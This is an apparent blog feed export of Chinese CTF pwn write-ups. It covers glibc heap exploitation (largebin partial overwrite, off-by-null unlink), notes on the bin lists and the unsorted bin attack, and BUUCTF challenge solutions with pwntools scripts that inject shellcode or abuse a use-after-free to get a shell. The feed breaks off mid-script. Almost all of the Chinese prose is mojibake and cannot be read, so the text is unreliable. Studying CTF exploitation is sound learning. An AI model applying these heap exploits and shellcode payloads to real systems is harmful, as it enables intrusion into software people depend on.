<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite bk -&gt; fd by largebin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x9F8</span>)  <span class="hljs-comment"># 3 chunk into largebin</span><br>add(<span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5 partial overwrite fd</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 7 c20</span><br></code></pre></td></tr></table></figure>

<h5 id="5-ä¼ªé€ -prev-sizeï¼Œoff-by-null-ä¿®æ”¹-size-çš„-p-æ ‡å¿—ä½"><a href="#5-ä¼ªé€ -prev-sizeï¼Œoff-by-null-ä¿®æ”¹-size-çš„-p-æ ‡å¿—ä½" class="headerlink" title="5. ä¼ªé€  prev_sizeï¼Œoff by null ä¿®æ”¹ size çš„ p æ ‡å¿—ä½"></a>5. ä¼ªé€  prev_sizeï¼Œoff by null ä¿®æ”¹ size çš„ p æ ‡å¿—ä½</h5><p>è¿™éƒ¨åˆ†å†…å®¹ä¸æ˜¯æœ¬æ–‡é‡ç‚¹æ•…ç•¥è¿‡</p>
<h6 id="æ„é€ ä»£ç ï¼š-3"><a href="#æ„é€ ä»£ç ï¼š-3" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a>æ„é€ ä»£ç ï¼š</h6><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># off by null</span><br>add(<span class="hljs-number">0x108</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>))  <span class="hljs-comment"># 8</span><br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0xA90</span>))<br>delete(<span class="hljs-number">3</span>)  <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure>

<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä½ç‰ˆæœ¬çš„æ£€æŸ¥è¿‡å°‘çš„æ—¶ä»£å·²ç»ä¸€å»ä¸è¿”ï¼Œæ–°ç‰ˆæœ¬çš„æ£€æŸ¥å¢å¤šï¼Œä½¿å¾—åˆ©ç”¨æ‰‹æ³•ä¹Ÿéšä¹‹å¤æ‚ï¼Œä½†æœ¬è´¨éƒ½æ˜¯å †å—çš„è‰¯å¥½å¸ƒå±€ï¼Œå¯¹å„ç§biné“¾ä¸Šç”¨äºç®¡ç†è€Œä¼šæ®‹ä½™çš„åƒåœ¾æ•°æ®è¿›è¡Œåˆ©ç”¨ï¼Œä»¥åŠåœ¨æ–°ç‰ˆæœ¬ä¸‹ä¼¼ä¹æœ‰äº›è¶‹å‘äºåˆ©ç”¨ large chunk æ„é€ å †å—äº†ã€‚æœ€åå¤§ä½¬ä½¿ç”¨çš„å¸ƒç½®æ€æƒ³ååˆ†å€¼å¾—æˆ‘è¿™ä¸ªå°èœé¸¡æ·±åˆ»å­¦ä¹ ç†è§£ï¼Œä¸ºäº†é¿å…çˆ†ç ´è€Œæ„é€ å‡ºåç§»åœ¨0x100å†…çš„å †å—ï¼Œè†œæ‹œpwnğŸ‘´</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>biné“¾æƒ…å†µé›†åˆ</title>
    <url>/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154252123-1627363406388.png" alt="image-20210720154252123"></p>
<h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><h3 id="åŸºæœ¬ç»“æ„"><a href="#åŸºæœ¬ç»“æ„" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><ul>
<li><p>å¤§å°èŒƒå›´ï¼š0x20 - 0x80</p>
</li>
<li><p>å•é“¾è¡¨ç»“æ„ï¼Œåªæœ‰fdæŒ‡é’ˆ</p>
</li>
<li><p>FILOï¼ˆæœ€åä¸€ä¸ªè¿›å…¥fastbiné“¾è¡¨çš„ï¼Œä¼šè¢«æ”¾åœ¨å¤´éƒ¨ï¼‰<br>æ€»å…±æœ‰åä¸ªfastbiné“¾è¡¨ï¼Œæ¯ä¸ªé“¾è¡¨ä¸­fastbinçš„sizeä¸€æ ·ï¼Œ0x10é€’å¢<br>å¤§å°å±äºfastbinçš„chunkè¢«freeæ‰æ—¶ï¼Œä¸ä¼šæ”¹å˜nextchunkçš„previnuseä½ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ä¼šè¢«åˆå¹¶ã€‚</p>
</li>
</ul>
<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154343954-1627363410633.png" alt="image-20210720154343954"></p>
<h3 id="æ£€æŸ¥"><a href="#æ£€æŸ¥" class="headerlink" title="æ£€æŸ¥"></a>æ£€æŸ¥</h3><ul>
<li>è¢«é‡Šæ”¾çš„å †å—çš„fdæŒ‡é’ˆä¸èƒ½æŒ‡å‘è‡ªå·±ï¼ˆè¿™ä¹Ÿå°±æ˜¯æƒ³è¦double freeçš„æ—¶å€™ï¼Œè¿˜éœ€è¦ä¸€ä¸ªä¸­é—´chunkçš„åŸå› ï¼‰</li>
<li>å°†fastbiné‡Œé¢çš„chunkåˆ†é…å‡ºå»æ—¶ï¼Œä¼šæ£€æŸ¥sizeä½ä¼šä¸ä¼šåŒ¹é…chunkçš„å¤§å°ï¼Œä¼šæ‰èƒ½åˆ†é…</li>
</ul>
<h3 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>æ„é€ ä¸¤ä¸ªç›¸åŒ size çš„å †å— a å’Œ bï¼Œæˆ‘ä»¬å…ˆ free (a) è®©ä»–è¿›å…¥åˆ° fast bin ä¸­ï¼Œå† free (b) ä¹Ÿè®©ä»–è¿›å…¥åˆ° fast binä¸­ã€‚è¿™æ—¶å€™ï¼Œåœ¨å †å— b çš„ fd ä½ç½®å°±å­˜åœ¨ç€å †å— a çš„åœ°å€ï¼Œæˆ‘ä»¬ leak å‡ºæ¥å°±èƒ½å¤Ÿå¾—åˆ°å †åœ°å€</p>
<h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h3 id="åŸºæœ¬ç»“æ„-1"><a href="#åŸºæœ¬ç»“æ„-1" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256-1627266738935.png" style="zoom:80%;">



<ul>
<li><p>åªæœ‰ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå­˜åœ¨fdå’ŒbkæŒ‡é’ˆ</p>
</li>
<li><p>åœ¨unsorted binä¸­ï¼Œå¯¹chunkçš„å¤§å°å¹¶æ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•å¤§å°çš„chunkï¼ˆæœªè¢«å½’ç±»ï¼‰éƒ½å¯ä»¥å½’å±åˆ°unsorted binä¸­ï¼Œä¸´æ—¶å­˜å‚¨ç”¨</p>
</li>
<li><p>unsortedbiné‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</p>
</li>
<li><p>chunkè¢«é‡Šæ”¾è¿›å…¥unsortedbinæ—¶ï¼Œfdbkå­—æ®µä¼šç•™ä¸‹ä¸€ä¸ªmain_arenaçš„åœ°å€ä¿¡æ¯</p>
</li>
</ul>
<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>libc-2.29.soä»¥ä¸‹ï¼š</p>
<p>åˆ©ç”¨å‰ææ˜¯å…ˆæœ‰UAFï¼Œä¿®æ”¹unsortedbinä¸­çš„FDå­—æ®µä¸º0ï¼ŒBKå­—æ®µä¸ºtarget addr - 0x10ï¼Œç„¶åmallocä¸€ä¸ªç›¸åŒå¤§å°çš„chunkï¼Œå³å¯å®Œæˆæ”»å‡»ï¼Œåœ¨ç›®æ ‡åœ°å€å†™å…¥unsorted binçš„åœ°å€ï¼Œä¸€èˆ¬ç”¨æ¥ä¼ªé€ å †å¤´ï¼ˆåˆ¶é€ å‡º0x7fï¼‰ã€ä¿®æ”¹æ¬¡æ•°é™åˆ¶ã€ä¸Šé™ä¿¡æ¯ã€é…åˆå±€éƒ¨å†™</p>
<h3 id="å°æŠ€å·§-1"><a href="#å°æŠ€å·§-1" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>å½“ unsorted bin é“¾ä¸Šæœ‰ä¸¤ä¸ªå †å—çš„æ—¶å€™ï¼Œå…¶ä¸­ä¸€ä¸ªå †å—çš„ fd ä¼šæŒ‡å‘å¦ä¸€ä¸ªå †å—ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ leak å¾—åˆ°ï¼Œå¯è®¡ç®—å‡ºå †åŸºå€</p>
<h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h3 id="åŸºæœ¬ç»“æ„-2"><a href="#åŸºæœ¬ç»“æ„-2" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256.png" alt="image-20210726103140256" style="zoom:80%;">

<ul>
<li>å¤§å°èŒƒå›´ï¼š0x90 - 0x400</li>
<li>ç”±62ä¸ªåŒå‘é“¾è¡¨ç»„æˆï¼Œæ¯ä¸ªé“¾è¡¨ä¸­çš„chunkå¤§å°ä¸€æ ·ï¼Œå¤§å°ä»¥0x10é€’å¢ï¼Œå­˜åœ¨fdå’ŒbkæŒ‡é’ˆ</li>
<li>ç›¸é‚»çš„free chunkä¼šè§¦å‘åˆå¹¶æ“ä½œï¼Œå³åˆå¹¶æˆä¸€ä¸ªå¤§çš„free chunk</li>
<li>é‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</li>
</ul>
<h3 id="å°æŠ€å·§-2"><a href="#å°æŠ€å·§-2" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>small bin ä¸­å­˜åœ¨ä¸¤ä¸ªå—æ—¶ï¼Œç¬¬ä¸€ä¸ªå—çš„fdæŒ‡é’ˆæŒ‡å‘main_arenaï¼ŒbkæŒ‡é’ˆæŒ‡å‘äº†ä¸‹ä¸€ä¸ªå †å—ï¼Œæ‰€ä»¥å¯ä»¥æ³„éœ²å‡ºlibcä»¥åŠå †åœ°å€</p>
<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h3 id="åŸºæœ¬ç»“æ„-3"><a href="#åŸºæœ¬ç»“æ„-3" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720153655147.png" alt="image-20210720153655147" style="zoom:80%;">

<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103541056-1627363427270.png" alt="image-20210726103541056"></p>
<ul>
<li>å¤§å°èŒƒå›´ï¼š0x410 ä»¥ä¸Š</li>
<li>63ä¸ªåŒå‘é“¾è¡¨ï¼Œä¸ä»…å­˜åœ¨fdå’ŒbkæŒ‡é’ˆï¼ŒåŒæ—¶è¿˜æœ‰fd nextsize å’Œ bk nextsize</li>
<li>åŒä¸€ä¸ªåŒå‘é“¾è¡¨ä¸­chunkå¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œä½†æ˜¯åœ¨ä¸€å®šèŒƒå›´å†…ï¼Œbinså¤§å°ä»å°åˆ°å¤§æ’åˆ—</li>
<li>ç›¸é‚»çš„free chunkä¼šè§¦å‘åˆå¹¶æ“ä½œï¼Œå³åˆå¹¶æˆä¸€ä¸ªå¤§çš„free chunk</li>
<li>é‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</li>
<li><strong>åœ¨è¿™63ä¸ªlargebinsä¸­ï¼šç¬¬ä¸€ç»„çš„32ä¸ªlargebiné“¾</strong>ä¾æ¬¡ä»¥64å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼Œå³ç¬¬ä¸€ä¸ªlargebiné“¾ä¸­chunksizeä¸º1024-1087å­—èŠ‚ï¼Œç¬¬äºŒä¸ªlarge binä¸­chunk sizeä¸º1088~1151å­—èŠ‚ã€‚<strong>ç¬¬äºŒç»„çš„16ä¸ªlargebiné“¾</strong>ä¾æ¬¡ä»¥512å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼›<strong>ç¬¬ä¸‰ç»„çš„8ä¸ªlargebiné“¾</strong>ä»¥æ­¥é•¿4096ä¸ºé—´éš”ï¼›<strong>ç¬¬å››ç»„çš„4ä¸ªlargebiné“¾</strong>ä»¥32768å­—èŠ‚ä¸ºé—´éš”ï¼›<strong>ç¬¬äº”ç»„çš„2ä¸ªlargebiné“¾</strong>ä»¥262144å­—èŠ‚ä¸ºé—´éš”ï¼›<strong>æœ€åä¸€ç»„</strong>çš„largebiné“¾ä¸­çš„chunkå¤§å°æ— é™åˆ¶ã€‚</li>
</ul>
<h3 id="å°æŠ€å·§-3"><a href="#å°æŠ€å·§-3" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>å¦‚æœå †å—åœ¨ largebin ä¸­ï¼Œä»–çš„ <strong>fd_nextsize</strong> å’Œ <strong>bk_nextsize</strong> éƒ½ä¼šæŒ‡å‘å †å—åœ°å€ï¼Œå¯ä»¥æ³„éœ²å‡ºå †åœ°å€</p>
<p>å¦‚æœlargenbinä¸Šä»…æœ‰ä¸€ä¸ªå †å—ï¼Œé‚£è¯¥å †å—çš„fd_nextsizeå’Œbk_nextsizeæŒ‡å‘è‡ªèº«</p>
<h1 id="mallocè¿‡ç¨‹"><a href="#mallocè¿‡ç¨‹" class="headerlink" title="mallocè¿‡ç¨‹"></a>mallocè¿‡ç¨‹</h1><ul>
<li><p>è®¡ç®—çœŸæ­£å †å—å¤§å°ï¼ˆåŠ ä¸Šå¤´éƒ¨é•¿åº¦ã€å¯¹é½ï¼‰</p>
</li>
<li><p>æ˜¯å¦åœ¨fastbinèŒƒå›´å†…ï¼Ÿ</p>
<ul>
<li>æ˜¯ï¼Œæ£€æŸ¥å¯¹åº”çš„biné“¾è¡¨ä¸­æœ‰æ²¡æœ‰chunk<ul>
<li>æœ‰ï¼Œåˆ†é…ç»™ç”¨æˆ·ï¼Œç»“æŸ</li>
</ul>
</li>
</ul>
</li>
<li><p>å¦‚æœä¸åœ¨fastbinèŒƒå›´å†…ï¼Œæˆ–è€…æ²¡æœ‰chunkå¯ç”¨</p>
</li>
<li><p>æ˜¯å¦åœ¨smallbinèŒƒå›´å†…ï¼Ÿ</p>
<ul>
<li>æ˜¯ï¼Œæ£€æŸ¥å¯¹åº”å¤§å°çš„biné“¾è¡¨ä¸­æœ‰æ²¡æœ‰chunk<ul>
<li>æœ‰ï¼Œåˆ†é…ç»™ç”¨æˆ·ï¼Œç»“æŸ</li>
</ul>
</li>
</ul>
</li>
<li><p>å¦‚æœä¸åœ¨smallbinèŒƒå›´å†…ï¼Œæˆ–è€…smallbiné‡Œé¢ä¹Ÿæ²¡æœ‰</p>
</li>
<li><p>unsortedbinä¸­æœ‰æ²¡æœ‰chunkï¼Ÿ</p>
<ul>
<li>æœ‰ï¼Œä»å°¾éƒ¨å–å‡ºç¬¬ä¸€ä¸ªchunkï¼Œçœ‹çœ‹å¤§å°æ˜¯å¦æ»¡è¶³éœ€æ±‚<ul>
<li>æ»¡è¶³ï¼Œåˆ‡åˆ†åå¤§å°æ˜¯å¦å¤§äºminsizeï¼Ÿï¼ˆ64ä½ä¸‹minisizeä¸º0x20ï¼‰<ul>
<li>å¤§äºï¼Œåˆ‡åˆ†å—ï¼Œè¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„å—æ”¾è¿›unsortedbin</li>
<li>å°äºæˆ–ç­‰äºminsizeï¼Œç›´æ¥å…¨éƒ¨åˆ†é…ç»™ç”¨æˆ·ï¼Œç»“æŸ</li>
</ul>
</li>
<li>ä¸æ»¡è¶³ï¼ŒæŠŠè¿™ä¸ªå—æ”¾å…¥small/largebinå¯¹åº”çš„é“¾è¡¨ä¸­ï¼Œç»§ç»­éå†ä¸‹ä¸€ä¸ªå—</li>
</ul>
</li>
</ul>
</li>
<li><p>å¦‚æœunsortedbinä¸­æ‰€æœ‰çš„å—ä¹Ÿä¸èƒ½æ»¡è¶³éœ€æ±‚</p>
</li>
<li><p>å¤§å°æ˜¯å¦åœ¨largebinèŒƒå›´ï¼Ÿ</p>
<ul>
<li>æ˜¯ï¼Œæ£€æŸ¥å¯¹åº”çš„biné“¾è¡¨ä¸­æœ‰æ²¡æœ‰ç¬¦åˆçš„chunk<ul>
<li>æœ‰ï¼Œæ‰¾åˆ°æ»¡è¶³éœ€æ±‚æœ€å°çš„chunkï¼Œåˆ‡åˆ†å—è¿”å›ï¼Œå‰©ä¸‹çš„æ”¾è¿›unsortedbinä¸­</li>
</ul>
</li>
</ul>
</li>
<li><p>largebinä¹Ÿä¸è¡Œï¼Ÿå†æ¬¡éå†small/largeå¯»æ‰¾æœ€åˆé€‚çš„chunk</p>
</li>
<li><p>è¿˜æ˜¯æ²¡æœ‰ï¼Œé‚£å°±ä»topchunkä¸­åˆ‡å‰²</p>
</li>
<li><p>topchunkä¹Ÿä¸å¤Ÿï¼Ÿmmapç³»ç»Ÿè°ƒç”¨</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buu06</title>
    <url>/2021/06/05/2021-06-14-buu06/</url>
    <content><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œçœ‹çœ‹ä¿æŠ¤</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p>
<p>åªå¼€å¯äº†NX</p>
<p>è¿›å…¥idaçœ‹çœ‹ä»£ç <img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p>
<p>ç¬¬ä¸€ä¸ªåŠŸèƒ½å¾ˆç¥å¥‡çš„è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º0x10çš„æ•°æ®ï¼Œç„¶åç”¨systemè°ƒç”¨ï¼Ÿæˆ‘è·‘å»ncäº†ä¸€ä¸‹</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p>
<p>å¥½å§ï¼ŒæˆåŠŸè·å¾—flagäº†ã€‚</p>
<h3 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h3><p>checksecä¸€ä¸‹<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614103954.png"></p>
<p>ä¿æŠ¤éƒ½æ²¡å¼€å¯ï¼Œæ‹–å…¥idaåˆ†æä¸€ä¸‹ã€‚æ— æ³•F5åæ±‡ç¼–ï¼Œåªèƒ½çœ‹æ±‡ç¼–ä»£ç äº†ã€‚</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104047.png"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104037.png"></p>
<p>æœ‰ä¸ªvulnå‡½æ•°ï¼Œé‡Œé¢æœ‰è°ƒç”¨getså’Œputsä¸¤ä¸ªå‡½æ•°ï¼Œå¯ä»¥è¿›è¡Œè¾“å…¥ã€‚å†çœ‹å…¶ä»–ä»£ç ï¼Œåº•ä¸‹æœ‰ä¸ªcall eaxï¼Œå¯ä»¥è¿›è¡Œæ‰§è¡Œä»£ç ï¼Œçœ‹ä¸‹eaxçš„å†…å®¹æ¥è‡ªå“ªé‡Œ</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p>
<p>è¿™é‡Œä¼ é€’ç»™eaxçš„åœ°å€ä¸ä¸‹é¢è°ƒç”¨æ—¶ä¸€è‡´ï¼Œç„¶åvulnå‡½æ•°é‡Œé¢getsè¾“å…¥çš„åœ°å€æ˜¯ebp+8ä¸­å­˜æ”¾çš„åœ°å€ï¼Œå…¶å®å°±æ˜¯eaxé‡Œé¢çš„åœ°å€å†…å®¹ï¼Œæ‰€ä»¥æ•´ä¸ªç¨‹åºæ€»çš„è¯´å°±æ˜¯ä¼šæ‰§è¡Œæˆ‘ä»¬è¾“å…¥è¿›å»çš„ä¸œè¥¿ï¼ŒåŠ ä¸Šnxæœªå¼€ï¼Œè¾“å…¥shellcodeæ¥getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><p>å¸¸è§„checksecä¸€ä¸‹</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132448387.png" alt="image-20210727132448387"></p>
<p>è¿›å…¥idaçœ‹çœ‹ï¼Œå…¶å®é¢˜ç›®å·²ç»æœ‰æš—ç¤ºï¼Œuafï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå»deleteå‡½æ•°é‡Œé¢çœ‹çœ‹ï¼Œ</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132528641.png" alt="image-20210727132528641"></p>
<p>ç¡®å®å­˜åœ¨ç€uafï¼Œé‚£ä¹ˆè¯¥æ€ä¹ˆåˆ©ç”¨ï¼Ÿå†çœ‹çœ‹addå‡½æ•°å’Œprintfå‡½æ•°</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132617843.png" alt="image-20210727132617843"></p>
<p>è¿™è¾¹çš„addå‡½æ•°æ¯”è¾ƒå¥‡æ€ªï¼Œé¦–å…ˆæ˜¯æœ‰æ¬¡æ•°é™åˆ¶åªèƒ½ç”³è¯·äº”ä¸ªå †å—ï¼Œå…¶æ¬¡æ˜¯ä¼šç”³è¯·ä¸¤ä¸ªå †å—ï¼Œç¬¬ä¸€ä¸ªå †å—æ˜¯å›ºå®š8å­—èŠ‚å¤§å°ï¼Œå‰4ä¸ªå­—èŠ‚å­˜æ”¾ä¸€ä¸ªprint_note_contentå‡½æ•°çš„åœ°å€ï¼Œå4ä¸ªå­—èŠ‚æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œç”³è¯·ä¸€ä¸ªä»»æ„å¤§å°çš„å †å—</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132832076.png" alt="image-20210727132832076"></p>
<p>åœ¨printå‡½æ•°é‡Œé¢ï¼Œæœ€åä¼šè¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œå°±æ˜¯è°ƒç”¨å…ˆå‰åœ¨addå‡½æ•°é‡Œé¢ä¿å­˜çš„print_note_contentå‡½æ•°è¿›è¡Œæ‰“å°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †å—é‡Œé¢çš„å†…å®¹</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727133015119.png" alt="image-20210727133015119"></p>
<p>æœ€åå°±æ˜¯è¿˜å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•°</p>
<p>æ€è·¯ï¼šä¸€å¼€å§‹æ˜¯è§‰å¾—æ²¡æœ‰editè¿™ç±»çš„å‡½æ•°ï¼Œå¯èƒ½æ˜¯è¦åˆ¶é€ å †å—é‡å ï¼ŒæŠŠåé—¨å‡½æ•°åŠ«æŒåˆ°malloc_hooké‡Œé¢å»ï¼Œè¿˜ä»¥ä¸º5ä¸ªä¼šå¤Ÿï¼Œä½†æ˜¯ä¸€ä¸ªæ³„éœ²libcåŸºå€ï¼Œå†ä¸€ä¸ªç”³è¯·fastchunkè¿›è¡Œdouble freeï¼Œç„¶åè¿˜éœ€è¦ç”³è¯·å››æ¬¡ï¼Œè¶…è¿‡æ¬¡æ•°äº†</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727135534549.png" alt="image-20210727135534549"></p>
<p>è¿™æ˜¯double freeçš„fastbinä¸Šçš„æƒ…å†µï¼Œå› ä¸ºfreeä¹Ÿæ˜¯ä¸¤ä¸ªï¼Œæ‰€ä»¥ç›´æ¥è¿›è¡Œä¸¤æ¬¡æ“ä½œç›´æ¥å°±å¯ä»¥æ„é€ å‡ºA-B-A</p>
<p>æ‰€ä»¥æ¢ä¸€ç§æ–¹æ³•ï¼šåˆ©ç”¨é‚£ä¸ªå‡½æ•°è°ƒç”¨ï¼Œæƒ³åŠæ³•æŠŠè¿›è¡Œè°ƒç”¨çš„å †å—å˜æˆæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„é‚£ä¸ªå †å—ï¼ŒæŠŠå†…å®¹æ”¹æˆåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥getshelläº†ï¼</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727140624461.png" alt="image-20210727140624461"></p>
<p>åƒè¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †å—ç”³è¯·ä¸€ä¸ªæ¯”0x8å¤§çš„å †å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸ä¼šç”³è¯·èµ°ï¼Œè€Œå›ºå®šç”³è¯·å¤§å°ä¸º0x8çš„å †å—å°±ä¼šç”³è¯·èµ°ä¸€ä¸ªï¼Œæ­¤æ—¶æˆ‘ä»¬ï¼Œå¦‚æœå†ç”³è¯·0x8çš„å †å—ï¼Œå°±ä¼šè¿›è¡Œæ›´æ¢äº†ï¼Œæˆ‘ä»¬ç”³è¯·åˆ°çš„å°±æ˜¯ä¹‹å‰ç¨‹åºçš„å›ºå®šå †å—ï¼Œæœ€åprintfä¸€ä¸‹ï¼Œå°±getshelläº†ï¼</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727141018340.png" alt="image-20210727141018340"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span 